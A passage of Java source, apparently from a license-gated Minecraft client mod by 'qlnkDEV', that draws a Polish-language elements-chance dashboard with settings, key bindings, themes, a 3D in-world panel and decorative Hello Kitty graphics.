				var offset = current.anchor().subtract(camera.pos);
				matrices.translate(offset.x, offset.y, offset.z);
				matrices.multiply(net.minecraft.util.math.RotationAxis.POSITIVE_Y.rotationDegrees(180 - current.yaw()));
				float scale = (float) current.scale();
				matrices.scale(scale, -scale, scale);
				matrices.translate(-WIDTH / 2.0, -HEIGHT / 2.0, 0);
				context.commandQueue().submitCustom(matrices, net.minecraft.client.render.RenderLayers.entityCutoutNoCull(WHITE_TEXTURE), (entry, vertices) -> {
					var matrix = entry.getPositionMatrix();
					for (Rect rectangle : current.rectangles()) {
						float x = rectangle.x(), y = rectangle.y(), z = rectangle.z() * 2;
						float right = x + rectangle.width(), bottom = y + rectangle.height();
						vertices.vertex(matrix, x, y, z).color(rectangle.color() | 0xFF000000)
								.texture(0.5f, 0.5f).overlay(net.minecraft.client.render.OverlayTexture.DEFAULT_UV)
								.light(0xF000F0).normal(entry, 0, 0, 1);
						vertices.vertex(matrix, x, bottom, z).color(rectangle.color() | 0xFF000000)
								.texture(0.5f, 0.5f).overlay(net.minecraft.client.render.OverlayTexture.DEFAULT_UV)
								.light(0xF000F0).normal(entry, 0, 0, 1);
						vertices.vertex(matrix, right, bottom, z).color(rectangle.color() | 0xFF000000)
								.texture(0.5f, 0.5f).overlay(net.minecraft.client.render.OverlayTexture.DEFAULT_UV)
								.light(0xF000F0).normal(entry, 0, 0, 1);
						vertices.vertex(matrix, right, y, z).color(rectangle.color() | 0xFF000000)
								.texture(0.5f, 0.5f).overlay(net.minecraft.client.render.OverlayTexture.DEFAULT_UV)
								.light(0xF000F0).normal(entry, 0, 0, 1);
					}
				});
				for (Label label : current.labels()) {
					matrices.push();
					matrices.translate(label.x(), label.y(), 1.0f);
					matrices.scale(label.scale(), label.scale(), 1);
					context.commandQueue().submitText(matrices, 0, 0, label.text(), false,
							net.minecraft.client.font.TextRenderer.TextLayerType.NORMAL, 0xF000F0, label.color(), 0, 0);
					matrices.pop();
				}
			} finally {
				matrices.pop();
			}
		}
	}

	public static class Dashboard extends Screen {
		private final long loadTime = LOADING_MILLIS * 1_000_000L;

		private static final String[] TABS = {
				"Żywioły", "Profil", "Statystyki", "Ustawienia", "Pomoc"
		};

		private int tab;
		private int settingsPage;
		private int x, y, w, h, sidebar, cx, cw;
		private float panelScale = 1;
		private float panelLeft, panelTop;
		private static final int PANEL_WIDTH = 760;
		private static final int PANEL_HEIGHT = 460;
		private boolean unlocked;
		private String message = "";
		private String draft = "";

		private TextFieldWidget licenseField;
		private ModernButton checkButton;
		private int observedChecks = completedChecks;
		private boolean capturingKey;
		private boolean capturingInteraction;

		private final long openedAt = System.nanoTime();
		private long transitionAt = openedAt + loadTime;

		private boolean loading = true;
		private boolean closing;
		private long closeAt;
		private long lastFrame = System.nanoTime();

		private final double[] displayed = {
				VALUES[0], VALUES[1], VALUES[2]
		};

		private final List<ModernButton> buttons = new ArrayList<>();
		private double opacity = 1;

		public Dashboard() {
			super(Text.literal("Panel żywiołów"));
			requestAvatar();
		}

		private boolean busy() {
			return loading || closing || capturingKey;
		}

		private ModernButton button(
				String label, int bx, int by, int bw,
				boolean accent, boolean danger, Runnable action
		) {
			ModernButton button =
					new ModernButton(bx, by, bw, label, accent, danger, action);

			buttons.add(button);
			return addDrawableChild(button);
		}

		private void activate() {
			try {
				String token = licenseField.getText().trim();
				License candidate = verify(token);

				if (!candidate.active()) {
					message = "Ta licencja wygasła.";
					notice("Licencja wygasła", "Wpisz nowy klucz.", true);
					return;
				}

				license = candidate;
				notice("Licencja aktywowana", "Witaj, " + candidate.owner + "!", false);
				STORE.put("license", token);
				save();

				draft = "";
				message = "";
				tab = 0;

				requestAvatar();
				transitionAt = System.nanoTime();
				clearAndInit();

			} catch (Exception e) {
				message = "Nieprawidłowy klucz lub brak klucza publicznego.";
				notice("Nie udało się aktywować", "Sprawdź klucz licencji.", true);
			}
		}

		private void logoutFromPanel() {
			logout();
			notice("Wylogowano", "Zapisane wyniki pozostają na urządzeniu.", false);

			draft = "";
			tab = 0;
			message = "Wylogowano. Wpisz licencję, aby wrócić.";
			transitionAt = System.nanoTime();

			clearAndInit();
		}

		private void addActivation(int fieldY) {
			licenseField = new TextFieldWidget(
					textRenderer, cx, fieldY, cw, 24,
					Text.literal("Klucz licencji")
			);

			licenseField.setMaxLength(2048);
			licenseField.setText(draft);
			licenseField.setChangedListener(value -> draft = value);
			licenseField.setPlaceholder(Text.literal("Wklej klucz licencji"));
			licenseField.setEditableColor(0xFFF2EEFA);

			addDrawableChild(licenseField);

			button(
					"Aktywuj licencję",
					cx, fieldY + 32, Math.min(150, cw),
					true, false, this::activate
			);
		}

		@Override
		protected void init() {
			buttons.clear();
			checkButton = null;
			licenseField = null;

			w = PANEL_WIDTH;
			h = PANEL_HEIGHT;
			x = 0;
			y = 0;
			panelScale = Math.max(0.01f, (float) userScale * Math.min(1.5f, Math.min((width - 12f) / w, (height - 12f) / h)));
			panelLeft = (width - w * panelScale) / 2;
			panelTop = (height - h * panelScale) / 2;

			sidebar = 190;
			cx = x + sidebar + 18;
			cw = w - sidebar - 36;

			unlocked = licensed();

			if (loading) return;

			button(
					"Zamknij", x + w - 96, y + h - 76, 78,
					false, false, this::close
			);

			if (!unlocked) {
				addActivation(y + 111);
				setInitialFocus(licenseField);
				return;
			}

			for (int i = 0; i < TABS.length; i++) {
				final int target = i;

				button(
						TABS[i],
						x + 10, y + 76 + i * 30, sidebar - 20,
						i == tab, false,
						() -> {
							if (tab == target) return;

							tab = target;
							message = "";
							transitionAt = System.nanoTime();
							clearAndInit();
						}
				);
			}

			if (tab == 0) {
				checkButton = button(
						"Sprawdź szanse",
						cx, y + h - 76, Math.min(165, cw - 90),
						true, false,
						() -> {
							startAnalysis();
							if (!hasResult) Arrays.fill(displayed, 0);
							refreshButtons();
						}
				);

			} else if (tab == 1) {
				addActivation(y + 135);

			} else if (tab == 3) {
				int half = (cw - 14) / 2;
				String[] sections = {"Wygląd", "Sterowanie i 3D", "Konto"};
				int sectionWidth = (cw - 20) / 3;
				for (int i = 0; i < sections.length; i++) {
					final int selectedPage = i;
					button(sections[i], cx + i * (sectionWidth + 10), y + 76, sectionWidth,
							settingsPage == i, false, () -> { settingsPage = selectedPage; clearAndInit(); });
				}
				if (settingsPage == 0) {
					VisualSwitch toggle = new VisualSwitch(cx + cw - 62, y + 108);
					buttons.add(toggle); addDrawableChild(toggle);
					int themeWidth = (cw - 20) / 3;
					for (int i = 0; i < Theme.values().length; i++) {
						final Theme selected = Theme.values()[i];
						button(selected.label, cx + (i % 3) * (themeWidth + 10), y + 140 + (i / 3) * 36,
								themeWidth, theme == selected, false, () -> {
									theme = selected; STORE.put("theme", selected.name()); save(); clearAndInit();
								});
					}
					button("Animacje: " + (animations ? "WŁ." : "WYŁ."), cx, y + 232, half,
							false, false, () -> { animations = !animations; STORE.putBoolean("animations", animations); save(); clearAndInit(); });
					button("Tempo: " + speedLabel(), cx + half + 14, y + 232, half,
							false, false, () -> {
								animationSpeed = animationSpeed < 0.8 ? 1 : animationSpeed < 1.2 ? 1.4 : 0.65;
								STORE.putDouble("animationSpeed", animationSpeed); save(); clearAndInit();
							});
					button("Rozmiar: " + Math.round(userScale * 100) + "% · scroll", cx, y + 270, half,
							false, false, () -> {
								userScale = userScale < 0.69 ? 0.7 : userScale < 0.84 ? 0.85 : userScale < 0.99 ? 1.0 : 0.55;
								STORE.putDouble("worldVisualPanelScale", userScale); save(); clearAndInit();
							});
					button("Ikony: " + (showIcons ? "WŁ." : "WYŁ."), cx + half + 14, y + 270, half,
							false, false, () -> { showIcons = !showIcons; STORE.putBoolean("showIcons", showIcons); save(); clearAndInit(); });
					button("Powiadomienia: " + (showNotices ? "WŁ." : "WYŁ."), cx, y + 308, half,
							false, false, () -> { showNotices = !showNotices; STORE.putBoolean("showNotices", showNotices); noticeTitle = ""; save(); clearAndInit(); });
				} else if (settingsPage == 1) {
					button(capturingKey && !capturingInteraction ? "Wybierz klawisz..." : "GUI: " + openKey.getBoundKeyLocalizedText().getString(),
							cx, y + 150, half, true, false, () -> { capturingInteraction = false; capturingKey = true; clearAndInit(); });
					button(capturingKey && capturingInteraction ? "Wybierz klawisz..." : "Interakcja 3D: " + interactKey.getBoundKeyLocalizedText().getString(),
							cx + half + 14, y + 150, half, false, false, () -> { capturingInteraction = true; capturingKey = true; clearAndInit(); });
					button("Tryb panelu: " + (worldMode ? "3D w świecie" : "Okno 2D"), cx, y + 206, cw,
							true, false, () -> {
								worldMode = !worldMode; STORE.putBoolean("worldMode", worldMode); save();
								if (!worldMode) WorldBoard.hide();
								notice("Zapisano tryb", worldMode ? "Skrót otwiera panel w świecie." : "Skrót otwiera zwykłe okno.", false); clearAndInit();
							});
					button("Postaw / przenieś panel 3D", cx, y + 250, half, false, false, () -> {
						worldMode = true; STORE.putBoolean("worldMode", true); save();
						MinecraftClient mc = MinecraftClient.getInstance();
						WorldBoard.place(mc); mc.setScreen(null);
					});
					button("Schowaj panel 3D", cx + half + 14, y + 250, half, false, false, () -> {
						WorldBoard.hide(); notice("Panel schowany", "Skrót ponownie go postawi.", false);
					});
				} else {
					button("Przywróć ustawienia", cx, y + 230, half, false, false, this::resetSettings);
					button("Wyloguj", cx + half + 14, y + 230, half, false, true, this::logoutFromPanel);
				}
			}

			refreshButtons();
		}

		private void refreshButtons() {
			for (ModernButton button : buttons) {
				button.active = !busy();
			}

			if (checkButton != null) {
				checkButton.active = !busy() && !analyzing && licensed();
				checkButton.setMessage(Text.literal(
						analyzing ? "Analizowanie..." : "Sprawdź szanse"
				));
			}

			if (licenseField != null) {
				licenseField.setEditable(!busy());
			}
		}

		@Override
		public void tick() {
			super.tick();

			long now = System.nanoTime();

			if (closing && now - closeAt >= 180_000_000L / animationSpeed) {
				super.close();
				return;
			}

			if (loading && now - openedAt >= loadTime) {
				loading = false;
				transitionAt = now;
				clearAndInit();
			}

			if (licensed() != unlocked) {
				if (!licensed()) {
					analyzing = false;
					message = "Licencja wygasła. Wpisz nowy klucz.";
				}
				clearAndInit();
			}

			if (unlocked) {
				finishAnalysis();
				if (observedChecks != completedChecks) {
					if (analysisNew && animations) Arrays.fill(displayed, 0);
					observedChecks = completedChecks;
				}
			}
			refreshButtons();
		}

		@Override
		public void close() {
			if (closing) return;

			if (!animations) {
				super.close();
				return;
			}

			closing = true;
			closeAt = System.nanoTime();
			refreshButtons();
		}

		private void text(
				DrawContext c, String value, int tx, int ty, int color
		) {
			if (value.isEmpty() || opacity <= 0.01) return;

			c.drawText(
					textRenderer, value, tx, ty,
					tint(palette(color), opacity), false
			);
		}

		private void center(
				DrawContext c, String value, int tx, int ty, int color
		) {
			text(c, value, tx - textRenderer.getWidth(value) / 2, ty, color);
		}

		private void centerLarge(DrawContext c, String value, int tx, int ty, int color) {
			c.getMatrices().pushMatrix();
			try {
				c.getMatrices().translate(tx, ty);
				c.getMatrices().scale(1.6f, 1.6f);
				text(c, value, -textRenderer.getWidth(value) / 2, 0, color);
			} finally { c.getMatrices().popMatrix(); }
		}

		private void card(
				DrawContext c, int bx, int by, int bw, int bh, int color
		) {
			rounded(c, bx, by, bw, bh, tint(palette(color), opacity));
		}

		private void line(DrawContext c, String value, int offset) {
			text(c, fit(value, cw), cx, y + offset, 0xFFE1E0EB);
		}

		private String fit(String value, int maxWidth) {
			if (textRenderer.getWidth(value) <= maxWidth) return value;

			return textRenderer.trimToWidth(
					value, Math.max(0, maxWidth - 10)
			) + "…";
		}

		private void dots(DrawContext c, int dx, int dy, long now) {
			for (int i = 0; i < 3; i++) {
				double wave = animations
						? (Math.sin(now / 160_000_000.0 * animationSpeed - i * 1.1) + 1) / 2
						: 0.65;

				int rise = animations ? (int) (wave * 5) : 0;

				rounded(
						c, dx + i * 15, dy - rise, 6, 6,
						tint(theme.bright, opacity * (0.35 + wave * 0.65))
				);
			}
		}

		private void avatar(DrawContext c, long now) {
			int ax = x + 14;
			int ay = y + 24;

			int border = licensed() ? 0xFF66DBA0 : 0xFF555365;

			if (licensed() && animations) {
				double pulse = (Math.sin(now / 550_000_000.0 * animationSpeed) + 1) / 2;
				card(
						c, ax - 4, ay - 4, 36, 36,
						tint(0xFF66DBA0, 0.12 + pulse * 0.12)
				);
			}

			card(c, ax - 2, ay - 2, 32, 32, border);

			if (avatarReady && license != null) {
				PlayerSkinDrawer.draw(
						c, AVATAR_ID, ax, ay, 28,
						true, false, tint(0xFFFFFFFF, opacity)
				);
			} else {
				card(c, ax, ay, 28, 28, 0xFF655185);
				card(c, ax + 7, ay + 6, 14, 10, 0xFFDBC9F2);
				card(c, ax + 5, ay + 18, 18, 7, 0xFFDBC9F2);
			}

			if (theme == Theme.PINK) bow(c, ax + 17, ay - 5, 0.65f);
			String owner = license == null ? "Gość" : license.owner;
			int ownerX = x + 50;

			text(
					c, fit(owner, sidebar - 60),
					ownerX, y + 28, 0xFFFFFFFF
			);

			text(
					c, licensed() ? "Aktywna licencja" : "Brak licencji",
					ownerX, y + 43,
					licensed() ? 0xFF95E4B8 : 0xFFAFAABD
			);
		}

		private void renderElements(DrawContext c, long now, double dt) {
			int gap = 9;
			int cardWidth = (cw - gap * 2) / 3;
			int cardY = y + 75;
			int cardHeight = 180;

			double blend = 1 - Math.exp(-dt * 9 * animationSpeed);

			for (int i = 0; i < 3; i++) {
				int bx = cx + i * (cardWidth + gap);
				boolean highlight = hasResult && !analyzing && best() == i;

				card(
						c, bx, cardY, cardWidth, cardHeight,
						highlight ? mix(0xFF383848, COLORS[i], 0.45)
								: 0xFF383848
				);

				card(
						c, bx + 1, cardY + 1,
						cardWidth - 2, cardHeight - 2,
						0xFF22232E
				);

				double bob = animations ? Math.sin(now / 420_000_000.0 * animationSpeed + i * 1.4) * 2 : 0;
				if (highlight) {
					double pulse = animations ? 0.10 + 0.06 * (1 + Math.sin(now / 600_000_000.0 * animationSpeed)) : 0.16;
					card(c, bx + cardWidth / 2 - 23, cardY + 9, 46, 43, tint(COLORS[i], pulse));
				}
				if (showIcons) elementIcon(c, i, bx + cardWidth / 2 - 20, cardY + 22 + (int) bob, 40);
				else card(c, bx + cardWidth / 2 - 10, cardY + 28, 20, 3, COLORS[i]);

				center(
						c, NAMES[i], bx + cardWidth / 2,
						cardY + 78, 0xFFF3F2F8
				);

				if (!analyzing) {
					double target = hasResult ? VALUES[i] : 0;

					displayed[i] = animations
							? displayed[i] + (target - displayed[i]) * blend
							: target;
				}

				String value = analyzing ? "..."
						: hasResult ? Math.round(displayed[i]) + "%" : "—";

				centerLarge(c, value, bx + cardWidth / 2, cardY + 108, COLORS[i]);

				int barY = cardY + cardHeight - 15;
				int barWidth = cardWidth - 20;

				card(c, bx + 10, barY, barWidth, 5, 0xFF3B3B4C);

				double percent = analyzing
						? (animations
						   ? 50 + 30 * Math.sin(now / 300_000_000.0 * animationSpeed + i)
						   : 50)
						: displayed[i];

				card(
						c, bx + 10, barY,
						(int) (barWidth * percent / 100),
						5, COLORS[i]
				);
			}

			int ry = cardY + cardHeight + 10;

			card(c, cx, ry, cw, analyzing && theme == Theme.PINK ? 66 : 45, 0xFF23242F);

			if (analyzing) {
				text(c, "Analizowanie", cx + 12, ry + 11, 0xFFE5D5FF);
				dots(c, cx + cw - 52, ry + 13, now);

				double progress =
						1 - Math.max(0, analysisEnd - now)
								/ (double) analysisDuration;

				int progressY = ry + (theme == Theme.PINK ? 45 : 30);
				card(c, cx + 12, progressY, cw - 24, 3, 0xFF3C3549);
				card(
						c, cx + 12, progressY,
						(int) ((cw - 24) * Math.max(0, Math.min(1, progress))),
						3, 0xFFB487F2
				);
				if (theme == Theme.PINK) {
					int runnerX = cx + 28 + (int) ((cw - 56) * Math.max(0, Math.min(1, progress)));
					runningKitty(c, runnerX, progressY, now);
					text(c, "Hello Kitty sprawdza żywioły...", cx + 12, ry + 51, theme.muted);
				}

			} else if (hasResult) {
				text(
						c, "Aktualny najlepszy wynik",
						cx + 12, ry + 9, 0xFFB8B6C9
				);

				int b = best();

				text(
						c, NAMES[b] + " — " + VALUES[b] + "%",
						cx + 12, ry + 25, COLORS[b]
				);

			} else {
				text(
						c, "Gotowe do sprawdzenia",
						cx + 12, ry + 9, 0xFFF3EDFF
				);
				text(
						c, "Kliknij przycisk poniżej.",
						cx + 12, ry + 25, 0xFFB8B6C9
				);
			}
		}

		private String speedLabel() {
			return animationSpeed < 0.8 ? "Spokojne" : animationSpeed > 1.2 ? "Szybkie" : "Normalne";
		}

		private void resetSettings() {
			theme = Theme.PINK; animations = true; animationSpeed = 1; userScale = 0.66;
			STORE.remove("avatarStyle");
			worldVisuals = true; STORE.remove("worldVisuals");
			showIcons = true; showNotices = true; worldMode = false; WorldBoard.hide();
			for (String key : new String[]{"theme", "animations", "animationSpeed", "panelScale", "compactPanelScale", "worldVisualPanelScale", "showIcons", "showNotices", "worldMode", "loadingMillis"}) STORE.remove(key);
			setOpenKey(InputUtil.Type.KEYSYM.createFromCode(GLFW.GLFW_KEY_RIGHT_SHIFT));
			setBinding(interactKey, InputUtil.Type.KEYSYM.createFromCode(GLFW.GLFW_KEY_G), "interactKey");
			save(); clearAndInit();
			notice("Przywrócono ustawienia", "Licencja i wyniki pozostają zapisane.", false);
		}

		private void finishBinding(InputUtil.Key key) {
			capturingKey = false;
			KeyBinding binding = capturingInteraction ? interactKey : openKey;
			setBinding(binding, key, capturingInteraction ? "interactKey" : "openKey");
			capturingInteraction = false;
			clearAndInit();
			notice("Zapisano skrót", binding.isUnbound() ? "Skrót wyłączony." : binding.getBoundKeyLocalizedText().getString(), false);
		}

		@Override
		public boolean keyPressed(KeyInput input) {
			if (capturingKey) {
				if (input.key() == GLFW.GLFW_KEY_ESCAPE) {
					capturingKey = false; clearAndInit();
				} else if (input.key() == GLFW.GLFW_KEY_DELETE || input.key() == GLFW.GLFW_KEY_BACKSPACE) {
					finishBinding(InputUtil.UNKNOWN_KEY);
				} else {
					finishBinding(InputUtil.fromKeyCode(input));
				}
				return true;
			}
			return super.keyPressed(input);
		}

		private Click localClick(Click click) {
			return new Click((click.x() - panelLeft) / panelScale,
					(click.y() - panelTop) / panelScale, click.buttonInfo());
		}

		@Override
		public boolean mouseClicked(Click click, boolean doubled) {
			if (capturingKey) {
				finishBinding(InputUtil.Type.MOUSE.createFromCode(click.button()));
				return true;
			}
			return !busy() && super.mouseClicked(localClick(click), doubled);
		}

		@Override
		public boolean mouseReleased(Click click) {
			return super.mouseReleased(localClick(click));
		}

		@Override
		public boolean mouseDragged(Click click, double dx, double dy) {
			return !busy() && super.mouseDragged(localClick(click), dx / panelScale, dy / panelScale);
		}

		@Override
		public boolean mouseScrolled(double mx, double my, double horizontal, double vertical) {
			if (busy()) return false;
			if (vertical != 0 && mx >= panelLeft && mx <= panelLeft + w * panelScale
					&& my >= panelTop && my <= panelTop + h * panelScale) {
				userScale = Math.max(0.5, Math.min(1.0, userScale + Math.max(-1, Math.min(1, vertical)) * 0.025));
				STORE.putDouble("worldVisualPanelScale", userScale);
				save();
				clearAndInit();
				return true;
			}
			return super.mouseScrolled((mx - panelLeft) / panelScale,
					(my - panelTop) / panelScale, horizontal, vertical);
		}

		@Override
		public void mouseMoved(double mx, double my) {
			super.mouseMoved((mx - panelLeft) / panelScale, (my - panelTop) / panelScale);
		}

		@Override
		public void render(DrawContext c, int mouseX, int mouseY, float delta) {
			long now = System.nanoTime();
			double enter = animations ? Math.min(1, Math.max(0, (now - openedAt) / 220_000_000.0 * animationSpeed)) : 1;
			double exit = closing ? Math.max(0, 1 - (now - closeAt) / 180_000_000.0 * animationSpeed) : 1;
			c.fill(0, 0, width, height, tint(0xB00A0910, enter * exit));
			c.getMatrices().pushMatrix();
			try {
				c.getMatrices().translate(panelLeft, panelTop);
				c.getMatrices().scale(panelScale, panelScale);
				renderPanel(c, (int) ((mouseX - panelLeft) / panelScale),
						(int) ((mouseY - panelTop) / panelScale), delta);
			} finally {
				c.getMatrices().popMatrix();
			}
		}

		private void renderPanel(
				DrawContext c, int mouseX, int mouseY, float delta
		) {
			long now = System.nanoTime();
			double dt = Math.min(0.1, (now - lastFrame) / 1_000_000_000.0);
			lastFrame = now;

			double closeFade = closing
					? Math.max(0, 1 - (now - closeAt) / 180_000_000.0 * animationSpeed)
					: 1;

			double entryFade = animations
					? Math.max(0, Math.min(1, (now - openedAt) / 180_000_000.0 * animationSpeed))
					: 1;

			opacity = closeFade * entryFade;



			card(c, x - 3, y + 4, w + 6, h + 4, 0x55000000);
			card(c, x - 1, y - 1, w + 2, h + 2, 0xFF474052);
			card(c, x, y, w, h, 0xFF191A22);

			if (loading) {
				dots(c, x + w / 2 - 18, y + h / 2 - 4, now);

				center(
						c, "Ładowanie panelu",
						x + w / 2, y + h / 2 + 22, 0xFFC3BDCE
				);

				String label = "Version " + VERSION;

				text(
						c, label,
						x + w - textRenderer.getWidth(label) - 14,
						y + h - 20, 0xFFAFA7BE
				);
				return;
			}

			card(c, x + 1, y + 1, sidebar - 1, h - 44, 0xFF20202B);
			avatar(c, now);
			if (theme == Theme.PINK && showIcons) {
				drawHelloKitty(c, now);
				heart(c, x + 34, y + 256, 0xFFF1A0C6);
				heart(c, x + sidebar - 44, y + 285, 0xFFE877B3);
				heart(c, x + 62, y + 310, 0xFFF4B4D1);
			}

			double transition = animations
					? Math.max(0, Math.min(1, (now - transitionAt) / 200_000_000.0 * animationSpeed))
					: 1;

			double baseOpacity = opacity;
			opacity *= transition * transition * (3 - 2 * transition);

			c.getMatrices().pushMatrix();
			c.getMatrices().translate((float) (animations ? (1 - transition) * 10 : 0), 0);
			c.enableScissor(cx, y + 5, x + w - 10, y + h - 82);

			text(
					c, unlocked ? TABS[tab] : "Aktywuj licencję",
					cx, y + 24, 0xFFFFFFFF
			);

			text(
					c, unlocked ? "Panel żywiołów"
							: "Dostęp wymaga aktywnej licencji",
					cx, y + 43, 0xFFB6AFC4
			);

			if (!unlocked) {
				line(c, "Wklej klucz otrzymany od qlnkDEV.", 79);
				line(c, message, 181);

			} else {
				switch (tab) {
					case 0 -> renderElements(c, now, dt);

					case 1 -> {
						line(c, "Odbiorca: " + license.owner, 76);
						line(c, "Pozostało: " + remaining(), 95);
						line(c, "Wygasa: " + date(license.expires * 1000), 114);
						line(c, message, 203);
					}

					case 2 -> {
						card(c, cx, y + 75, cw, 54, 0xFF272833);
						line(c, "Ukończone sprawdzenia: " + completedChecks, 89);
						line(c, "Nowe zestawy wyników: " + draws, 110);
						line(c, "Wyniki zachowują się po zamknięciu panelu.", 150);
					}

					case 3 -> {
						if (settingsPage == 0) {
							line(c, "Motyw interfejsu", 116);
							text(c, "Visuals", cx + cw - 110, y + 116, theme.bright);
							line(c, "Rozmiar zmienisz również kółkiem myszy.", 348);
						} else if (settingsPage == 1) {
							line(c, "Kliknij skrót i wybierz klawisz lub przycisk myszy.", 118);
							line(c, capturingKey ? "Esc: anuluj · Delete: usuń skrót" : "Panel 3D zostaje w miejscu, w którym go postawisz.", 294);
						} else {
							line(c, "Licencja: " + (license == null ? "—" : license.owner), 112);
							line(c, "Pozostało: " + remaining(), 156);
							line(c, "Licencja przypisana do właściciela podanego powyżej.", 132);
							line(c, "Przywrócenie ustawień zachowuje licencję.", 276);
						}
					}

					case 4 -> {
						helpCard(c, "01", "Sprawdź wybraną osobę", 76, 94);
						text(c, "1. Wpisz /zywioly gry na serwerze.", cx + 46, y + 109, theme.muted);
						text(c, "2. Kliknij osobę w oknie serwera.", cx + 46, y + 127, theme.muted);
						text(c, "3. Otwórz mod i kliknij Sprawdź szanse.", cx + 46, y + 145, theme.bright);
						helpCard(c, "02", "Otwieranie i rozmiar", 182, 66);
						text(c, "/sprawdzms lub " + openKey.getBoundKeyLocalizedText().getString(), cx + 46, y + 215, theme.muted);
						text(c, "Kółko myszy nad GUI zmienia jego rozmiar.", cx + 46, y + 231, theme.muted);
						helpCard(c, "03", "Panel w świecie 3D", 260, 78);
						text(c, "Postaw panel: Ustawienia > Sterowanie i 3D.", cx + 46, y + 293, theme.muted);
						text(c, "Celuj w przycisk i naciśnij " + interactKey.getBoundKeyLocalizedText().getString() + ".", cx + 46, y + 310, theme.muted);
						text(c, "/sprawdzms zawsze otwiera zwykłe okno.", cx + 46, y + 326, theme.bright);

					}
				}
			}

			c.disableScissor();
			c.getMatrices().popMatrix();
			opacity = baseOpacity;

			c.fill(
					x + 12, y + h - 44,
					x + w - 12, y + h - 43,
					tint(theme.stroke, opacity)
			);

			text(
					c, licensed() ? "Licencja aktywna" : "Licencja nieaktywna",
					x + 14, y + h - 33,
					licensed() ? 0xFF89E3AF : 0xFFF4AE69
			);

			text(
					c, remaining(),
					x + 14, y + h - 18, 0xFFB4AEC1
			);

			String version = "Version " + VERSION + " · Beta";
			String author = "Stworzone przez qlnkDEV";

			text(
					c, version,
					x + w - textRenderer.getWidth(version) - 14,
					y + h - 33, 0xFFC5A4FA
			);

			text(
					c, author,
					x + w - textRenderer.getWidth(author) - 14,
					y + h - 18, 0xFFB4AEC1
			);

			for (ModernButton button : buttons) button.setAlpha((float) opacity);
			super.render(c, mouseX, mouseY, delta);
			renderNotice(c, now);
		}

		private void helpCard(DrawContext c, String number, String title, int top, int height) {
			card(c, cx, y + top, cw, height, theme.surface);
			card(c, cx + 12, y + top + 12, 25, 23, theme.accent);
			center(c, number, cx + 24, y + top + 19, 0xFFFFFFFF);
			text(c, title, cx + 46, y + top + 14, theme.bright);
		}

		private void elementIcon(DrawContext c, int kind, int ix, int iy, int size) {
			for (int row = 0; row < size; row++) {
				int[] rowColors = new int[size];
				for (int col = 0; col < size; col++) {
					double u = (col + 0.5) / size * 2 - 1;
					double v = (row + 0.5) / size * 2 - 1;
					boolean inside;
					if (kind == 0) {
						double half = v < 0 ? (v + 1) * 0.72 : 0.72 * Math.sqrt(Math.max(0, 1 - v * v));
						inside = Math.abs(u) < half;
					} else if (kind == 1) {
						double half = v < 0 ? (v + 1) * 0.7 : 0.7 * Math.sqrt(Math.max(0, 1 - v * v));
						double shift = 0.13 * Math.sin((v + 1) * 5);
						inside = Math.abs(u - shift) < half;
					} else {
						double axis = (u - v) / Math.sqrt(2);
						double cross = (u + v) / Math.sqrt(2);
						inside = Math.abs(axis) < 1 && Math.abs(cross) < 0.5 * (1 - axis * axis);
					}
					if (!inside) continue;
					double light = Math.max(0, Math.min(1, 0.3 - v * 0.2));
					int color = mix(COLORS[kind], 0xFFFFFFFF, light);
					if (kind == 1 && v > -0.1 && Math.abs(u) < (v + 0.1) * 0.27) color = 0xFFFFDC89;
					if (kind == 2 && Math.abs(u + v) < 0.10) color = 0xFFB7F7CF;
					rowColors[col] = tint(color, opacity);
				}
				for (int col = 0; col < size;) {
					int color = rowColors[col];
					int end = col + 1;
					while (end < size && rowColors[end] == color) end++;
					if (color != 0) c.fill(ix + col, iy + row, ix + end, iy + row + 1, color);
					col = end;
				}
			}
		}

		private void heart(DrawContext c, int hx, int hy, int color) {
			int[] widths = {3, 5, 11, 11, 9, 7, 5, 3, 1};
			for (int row = 0; row < widths.length; row++) {
				int half = widths[row] / 2;
				if (row < 2) {
					c.fill(hx - 5, hy + row, hx - 5 + widths[row], hy + row + 1, tint(color, opacity));
					c.fill(hx + 2, hy + row, hx + 2 + widths[row], hy + row + 1, tint(color, opacity));
				} else c.fill(hx - half, hy + row, hx + half + 1, hy + row + 1, tint(color, opacity));
			}
		}

		private void ellipse(DrawContext c, int centerX, int centerY, int rx, int ry, int color) {
			for (int row = -ry; row <= ry; row++) {
				double normalized = row / (double) ry;
				int half = (int) Math.round(rx * Math.sqrt(Math.max(0, 1 - normalized * normalized)));
				c.fill(centerX - half, centerY + row, centerX + half + 1, centerY + row + 1, tint(color, opacity));
			}
		}

		private void bow(DrawContext c, int bx, int by, float scale) {
			c.getMatrices().pushMatrix();
			try {
				c.getMatrices().translate(bx, by);
				c.getMatrices().scale(scale, scale);
				ellipse(c, 4, 6, 5, 5, 0xFFFF9BCC);
				ellipse(c, 14, 6, 5, 5, 0xFFFF9BCC);
				ellipse(c, 9, 6, 3, 3, 0xFFD85698);
				ellipse(c, 9, 5, 1, 1, 0xFFFFE5F2);
			} finally { c.getMatrices().popMatrix(); }
		}

		private void runningKitty(DrawContext c, int centerX, int baseline, long now) {
			double phase = animations ? now / 95_000_000.0 * animationSpeed : 0;
			int bounce = animations ? (int) (Math.abs(Math.sin(phase)) * 2) : 0;
			int top = baseline - 25 - bounce;
			int fur = 0xFFFFF7FC, ink = 0xFF49343F;
			ellipse(c, centerX, top + 20, 6, 5, theme.accent);
			int stride = animations ? (int) (Math.sin(phase) * 4) : 2;
			ellipse(c, centerX - 4 + stride, top + 25, 4, 2, fur);
			ellipse(c, centerX + 4 - stride, top + 25, 4, 2, fur);
			ellipse(c, centerX - 8, top + 19 - stride / 2, 3, 2, fur);
			ellipse(c, centerX + 8, top + 19 + stride / 2, 3, 2, fur);
			for (int row = 0; row < 7; row++) {
				int half = 1 + row / 2;
				c.fill(centerX - 8 - half, top + row, centerX - 8 + half, top + row + 1, tint(fur, opacity));
				c.fill(centerX + 8 - half, top + row, centerX + 8 + half, top + row + 1, tint(fur, opacity));
			}
			ellipse(c, centerX, top + 10, 13, 8, fur);
			ellipse(c, centerX - 5, top + 10, 1, 2, ink);
			ellipse(c, centerX + 5, top + 10, 1, 2, ink);
			ellipse(c, centerX, top + 13, 2, 1, 0xFFF3CE72);
			for (int row = 0; row < 2; row++) {
				c.fill(centerX - 16, top + 9 + row * 4, centerX - 11, top + 10 + row * 4, tint(ink, opacity));
				c.fill(centerX + 11, top + 9 + row * 4, centerX + 16, top + 10 + row * 4, tint(ink, opacity));
			}
			ellipse(c, centerX + 6, top + 3, 4, 3, theme.bright);
			ellipse(c, centerX + 12, top + 3, 4, 3, theme.bright);
